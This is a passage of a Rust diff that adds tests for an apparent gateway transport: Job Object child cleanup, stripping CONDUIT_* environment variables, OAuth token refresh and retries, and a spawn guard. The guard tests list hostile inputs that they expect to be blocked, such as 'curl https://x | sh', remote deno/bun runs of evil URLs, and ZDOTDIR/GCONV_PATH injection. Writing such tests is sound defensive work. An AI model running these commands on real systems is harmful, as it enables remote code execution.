+            .expect("spawn Job Object-owned launcher");
+
+        let created_deadline = Instant::now() + Duration::from_secs(8);
+        while !pid_file.exists() && Instant::now() < created_deadline {
+            std::thread::sleep(Duration::from_millis(25));
+        }
+        let grandchild_pid: u32 = std::fs::read_to_string(&pid_file)
+            .expect("launcher should record its grandchild pid")
+            .trim()
+            .parse()
+            .expect("grandchild pid should be numeric");
+        assert!(
+            process_is_running(grandchild_pid),
+            "grandchild must be alive before the Job Object closes"
+        );
+
+        drop(transport);
+        let exit_deadline = Instant::now() + Duration::from_secs(5);
+        while process_is_running(grandchild_pid) && Instant::now() < exit_deadline {
+            std::thread::sleep(Duration::from_millis(25));
+        }
+        assert!(
+            !process_is_running(grandchild_pid),
+            "closing the Job Object must terminate launcher descendants"
+        );
+        let _ = std::fs::remove_file(pid_file);
+        let _ = std::fs::remove_file(script_file);
+    }
+
     #[test]
     fn expand_cwd_handles_tilde_and_env() {
         use std::path::PathBuf;
@@ -1925,6 +2385,45 @@ mod tests {
             assert_eq!(expand_cwd("~"), home);
             assert_eq!(expand_cwd("~/proj"), home.join("proj"));
         }
+    }
+
+    #[test]
+    fn strips_gateway_control_env_from_children() {
+        use std::collections::HashSet;
+        use std::ffi::OsStr;
+        // pid-unique names so a parallel test's process-wide env set can't collide.
+        let secret = format!("CONDUIT_TEST_SECRET_{}", std::process::id());
+        let keep = format!("TP_KEEP_{}", std::process::id());
+        std::env::set_var(&secret, "leak-me");
+        std::env::set_var(&keep, "ok");
+
+        // Nothing configured: the inherited CONDUIT_* var is marked for removal from
+        // the child (get_envs records a removal as value None), and an unrelated var
+        // is left untouched.
+        let empty: HashSet<&str> = HashSet::new();
+        let mut cmd = std::process::Command::new("true");
+        super::strip_gateway_control_env(&mut cmd, &empty);
+        let overrides: Vec<_> = cmd.get_envs().collect();
+        assert!(
+            overrides.iter().any(|(k, v)| *k == OsStr::new(&secret) && v.is_none()),
+            "a CONDUIT_* var must be stripped from the child"
+        );
+        assert!(
+            !overrides.iter().any(|(k, _)| *k == OsStr::new(&keep)),
+            "an unrelated var must not be touched by the strip"
+        );
+
+        // A server that sets a CONDUIT_ var for itself keeps it (exempt from the strip).
+        let configured: HashSet<&str> = [secret.as_str()].into_iter().collect();
+        let mut cmd2 = std::process::Command::new("true");
+        super::strip_gateway_control_env(&mut cmd2, &configured);
+        assert!(
+            !cmd2.get_envs().any(|(k, _)| k == OsStr::new(&secret)),
+            "a server-configured CONDUIT_ var must be exempt from the strip"
+        );
+
+        std::env::remove_var(&secret);
+        std::env::remove_var(&keep);
     }
 
     #[test]
@@ -2050,10 +2549,11 @@ mod tests {
 
     #[test]
     fn http_sse_answers_inline_server_request_before_final_response() {
-        use super::{HttpTransport, ServerRequestHandler, Transport};
+        use super::{HttpTransport, RefreshFn, ServerRequestHandler, Transport};
         use serde_json::Value;
         use std::io::{Read, Write};
         use std::net::TcpListener;
+        use std::sync::atomic::{AtomicUsize, Ordering};
         use std::sync::Arc;
 
         let listener = TcpListener::bind("127.0.0.1:0").unwrap();
@@ -2082,6 +2582,9 @@ mod tests {
 
             let mut inline = listener.accept().unwrap().0;
             let inline_headers = read_http_headers(&mut inline);
+            assert!(String::from_utf8_lossy(&inline_headers)
+                .to_ascii_lowercase()
+                .contains("authorization: bearer fresh"));
             let mut body = String::new();
             if let Some(len) = content_length(&inline_headers) {
                 let mut raw = vec![0u8; len];
@@ -2140,7 +2643,18 @@ mod tests {
             }
         });
         let url = format!("http://127.0.0.1:{port}/");
-        let mut t = HttpTransport::new(&url);
+        let refresh_calls = Arc::new(AtomicUsize::new(0));
+        let calls = Arc::clone(&refresh_calls);
+        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
+            assert!(!force);
+            if calls.fetch_add(1, Ordering::SeqCst) == 1 {
+                Ok(Some("fresh".to_string()))
+            } else {
+                Ok(None)
+            }
+        }));
+        let mut t =
+            HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
         t.set_server_request_handler(handler);
         let result = t
             .post(
@@ -2149,6 +2663,7 @@ mod tests {
             )
             .expect("inline reply should unblock the SSE stream");
         server_handle.join().unwrap();
+        assert_eq!(refresh_calls.load(Ordering::SeqCst), 2);
         assert_eq!(
             result
                 .and_then(|v| v.get("result").cloned())
@@ -2328,6 +2843,69 @@ mod tests {
                 "{w} wrapper should be refused"
             );
         }
+    }
+
+    #[test]
+    fn spawn_guard_blocks_getopt_flag_clustering() {
+        // The eval flag packed behind benign boolean flags in one getopt cluster is a real
+        // inline-eval and must be blocked (`sh -ec`, `python -Ec`, `ruby/perl -we`, node -pe).
+        assert!(screen_spawn_command("sh", &argv(&["-ec", "curl https://x | sh"])).is_err());
+        assert!(screen_spawn_command("bash", &argv(&["-xec", "id"])).is_err());
+        assert!(screen_spawn_command("python", &argv(&["-Ec", "import os"])).is_err());
+        assert!(screen_spawn_command("python3", &argv(&["-Ec", "x"])).is_err());
+        assert!(screen_spawn_command("ruby", &argv(&["-we", "system('x')"])).is_err());
+        assert!(screen_spawn_command("perl", &argv(&["-we", "system('x')"])).is_err());
+        assert!(screen_spawn_command("node", &argv(&["-pe", "process.exit()"])).is_err());
+        // Value-taking flags swallow the rest of the token and must NOT be read as an eval
+        // (no false positives on real invocations).
+        assert!(screen_spawn_command("python", &argv(&["-mhttp.server"])).is_ok());
+        assert!(screen_spawn_command("python", &argv(&["-Wignore::DeprecationWarning", "a.py"])).is_ok());
+        assert!(screen_spawn_command("bash", &argv(&["-o", "pipefail", "script.sh"])).is_ok());
+        assert!(screen_spawn_command("ruby", &argv(&["-Ilib", "app.rb"])).is_ok());
+        assert!(screen_spawn_command("perl", &argv(&["-Ilib", "app.pl"])).is_ok());
+        // Plain non-clustered invocations still classify correctly.
+        assert!(screen_spawn_command("python", &argv(&["-c", "x"])).is_err());
+        assert!(screen_spawn_command("python", &argv(&["server.py"])).is_ok());
+        assert!(screen_spawn_command("bash", &argv(&["script.sh"])).is_ok());
+    }
+
+    #[test]
+    fn spawn_guard_closes_deno_bun_basename_and_env_bypasses() {
+        // deno/bun: a value-taking flag before the subcommand can't hide a remote fetch-exec.
+        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"])).is_err());
+        assert!(screen_spawn_command("deno", &argv(&["run", "https://evil.ts"])).is_err());
+        assert!(screen_spawn_command("deno", &argv(&["run", "data:text/javascript,alert(1)"])).is_err());
+        assert!(screen_spawn_command("bun", &argv(&["--cwd", "/x", "run", "https://evil"])).is_err());
+        // A local deno run stays allowed.
+        assert!(screen_spawn_command("deno", &argv(&["run", "./server.ts"])).is_ok());
+        // Multi-dot / versioned interpreter names still dispatch to the interpreter family.
+        assert!(screen_spawn_command("python3.10", &argv(&["-c", "x"])).is_err());
+        assert!(screen_spawn_command("C:\\py\\python3.11.exe", &argv(&["-c", "x"])).is_err());
+        // New wrappers and qemu-* user-mode emulators are refused.
+        assert!(screen_spawn_command("strace", &argv(&["node", "-e", "x"])).is_err());
+        assert!(screen_spawn_command("bwrap", &argv(&["python", "-c", "x"])).is_err());
+        assert!(screen_spawn_command("qemu-x86_64", &argv(&["/bin/node", "-e", "x"])).is_err());
+        // New always-blocked env vars; a benign var stays fine.
+        assert!(screen_spawn_env(&[("ZDOTDIR".into(), "/tmp/evil".into())]).is_err());
+        assert!(screen_spawn_env(&[("GCONV_PATH".into(), "/tmp/evil".into())]).is_err());
+        assert!(screen_spawn_env(&[("NODE_ENV".into(), "production".into())]).is_ok());
+    }
+
+    #[test]
+    fn spawn_guard_review_followups() {
+        // Windows py/pyw launchers forward -c and version selectors to python.
+        assert!(screen_spawn_command("py", &argv(&["-c", "import os"])).is_err());
+        assert!(screen_spawn_command("pyw", &argv(&["-c", "x"])).is_err());
+        assert!(screen_spawn_command("py", &argv(&["-3.11", "-c", "x"])).is_err());
+        assert!(screen_spawn_command("py", &argv(&["-3.11", "script.py"])).is_ok());
+        // A global value option can't hide the deno eval subcommand.
+        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "eval", "Deno.exit()"])).is_err());
+        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"])).is_err());
+        // Only the executable target is remote-checked; a URL passed as an app arg is fine.
+        assert!(screen_spawn_command("deno", &argv(&["run", "./server.ts", "--url", "https://api.example.com"])).is_ok());
+        assert!(screen_spawn_command("bun", &argv(&["run", "server.ts", "--url", "https://api.example.com"])).is_ok());
+        // `--` ends interpreter options, so a cluster-shaped APP arg after it isn't screened.
+        assert!(screen_spawn_command("python", &argv(&["server.py", "--", "-Ec"])).is_ok());
     }
 
     #[test]
@@ -2595,6 +3173,172 @@ mod tests {
     }
 
     #[test]
+    fn post_refreshes_proactively_before_sending() {
+        use super::{HttpTransport, RefreshFn};
+        use std::sync::atomic::{AtomicUsize, Ordering};
+        use std::sync::{Arc, Mutex};
+        use std::time::Duration;
+
+        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
+        let port = server.server_addr().to_ip().unwrap().port();
+        let seen_auth = Arc::new(Mutex::new(String::new()));
+        let captured = Arc::clone(&seen_auth);
+        let handle = std::thread::spawn(move || {
+            let req = server
+                .recv_timeout(Duration::from_secs(3))
+                .unwrap()
+                .expect("proactively refreshed request should reach the server");
+            *captured.lock().unwrap() = req
+                .headers()
+                .iter()
+                .find(|h| h.field.equiv("Authorization"))
+                .map(|h| h.value.as_str().to_string())
+                .unwrap_or_default();
+            let ct =
+                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
+                    .unwrap();
+            let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
+            let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
+        });
+
+        let refresh_calls = Arc::new(AtomicUsize::new(0));
+        let calls = Arc::clone(&refresh_calls);
+        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
+            assert!(!force, "successful proactive refresh should avoid a forced retry");
+            calls.fetch_add(1, Ordering::SeqCst);
+            Ok(Some("fresh".to_string()))
+        }));
+        let url = format!("http://127.0.0.1:{port}/");
+        let mut transport =
+            HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
+
+        let result = transport
+            .post(
+                &serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }),
+                true,
+            )
+            .expect("post should use the proactively refreshed token");
+        handle.join().unwrap();
+
+        assert!(result.is_some());
+        assert_eq!(refresh_calls.load(Ordering::SeqCst), 1);
+        assert_eq!(*seen_auth.lock().unwrap(), "Bearer fresh");
+    }
+
+    #[test]
+    fn post_uses_current_token_when_proactive_refresh_fails() {
+        use super::{HttpTransport, RefreshFn};
+        use std::sync::{Arc, Mutex};
+
+        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
+        let port = server.server_addr().to_ip().unwrap().port();
+        let seen_auth = Arc::new(Mutex::new(String::new()));
+        let captured = Arc::clone(&seen_auth);
+        let handle = std::thread::spawn(move || {
+            let req = server.recv().unwrap();
+            *captured.lock().unwrap() = req
+                .headers()
+                .iter()
+                .find(|h| h.field.equiv("Authorization"))
+                .map(|h| h.value.as_str().to_string())
+                .unwrap_or_default();
+            let ct =
+                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
+                    .unwrap();
+            let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
+            let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
+        });
+
+        let refresh: Option<RefreshFn> = Some(Box::new(|force| {
+            assert!(!force);
+            Err("temporary OAuth endpoint failure".to_string())
+        }));
+        let url = format!("http://127.0.0.1:{port}/");
+        let mut transport =
+            HttpTransport::with_auth_refresh(&url, Some("still-valid".to_string()), refresh);
+
+        let result = transport.post(
+            &serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }),
+            true,
+        );
+        handle.join().unwrap();
+
+        assert!(result.is_ok());
+        assert_eq!(*seen_auth.lock().unwrap(), "Bearer still-valid");
+    }
+
+    #[test]
+    fn forced_refresh_without_callback_returns_auth_error() {
+        use super::HttpTransport;
+
+        let mut transport = HttpTransport::new("http://127.0.0.1:1/");
+        let error = transport
+            .force_refresh_after_auth_error(401)
+            .expect_err("missing refresh callback should return an authentication error");
+
+        assert_eq!(
+            error.to_string(),
+            "HTTP 401 (needs authentication): no refresh callback configured"
+        );
+    }
+
+    #[test]
+    fn inline_post_refreshes_token_and_retries_on_401() {
+        use super::{HttpTransport, RefreshFn};
+        use std::sync::atomic::{AtomicUsize, Ordering};
+        use std::sync::{Arc, Mutex};
+
+        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
+        let port = server.server_addr().to_ip().unwrap().port();
+        let retry_auth = Arc::new(Mutex::new(String::new()));
+        let hits = Arc::new(AtomicUsize::new(0));
+        let (captured, hit_count) = (Arc::clone(&retry_auth), Arc::clone(&hits));
+        let handle = std::thread::spawn(move || {
+            for _ in 0..2 {
+                let req = server.recv().unwrap();
+                if hit_count.fetch_add(1, Ordering::SeqCst) == 0 {
+                    let _ = req.respond(
+                        tiny_http::Response::from_string("unauthorized").with_status_code(401),
+                    );
+                } else {
+                    *captured.lock().unwrap() = req
+                        .headers()
+                        .iter()
+                        .find(|h| h.field.equiv("Authorization"))
+                        .map(|h| h.value.as_str().to_string())
+                        .unwrap_or_default();
+                    let _ = req.respond(
+                        tiny_http::Response::from_string("{}").with_status_code(202),
+                    );
+                }
+            }
+        });
+
+        let refresh: Option<RefreshFn> = Some(Box::new(|force| {
+            if force {
+                Ok(Some("fresh".to_string()))
+            } else {
+                Ok(None)
+            }
+        }));
+        let url = format!("http://127.0.0.1:{port}/");
+        let mut transport =
+            HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
+
+        transport
+            .send_post_no_response(&serde_json::json!({
+                "jsonrpc": "2.0",
+                "id": 99,
+                "result": { "roots": [] }
+            }))
+            .expect("inline reply should refresh and retry");
+        handle.join().unwrap();
+
+        assert_eq!(hits.load(Ordering::SeqCst), 2);
+        assert_eq!(*retry_auth.lock().unwrap(), "Bearer fresh");
+    }
+
+    #[test]
     fn post_refreshes_token_and_retries_on_401() {
         use super::{HttpTransport, RefreshFn};
         use std::sync::atomic::{AtomicUsize, Ordering};
@@ -2635,7 +3379,13 @@ mod tests {
         });
 
         let url = format!("http://127.0.0.1:{port}/");
-        let refresh: Option<RefreshFn> = Some(Box::new(|| Some("fresh".to_string())));
+        let refresh: Option<RefreshFn> = Some(Box::new(|force| {
+            if force {
+                Ok(Some("fresh".to_string()))
+            } else {
+                Ok(None)
+            }
+        }));
         let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
         let res = t
             .post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true)
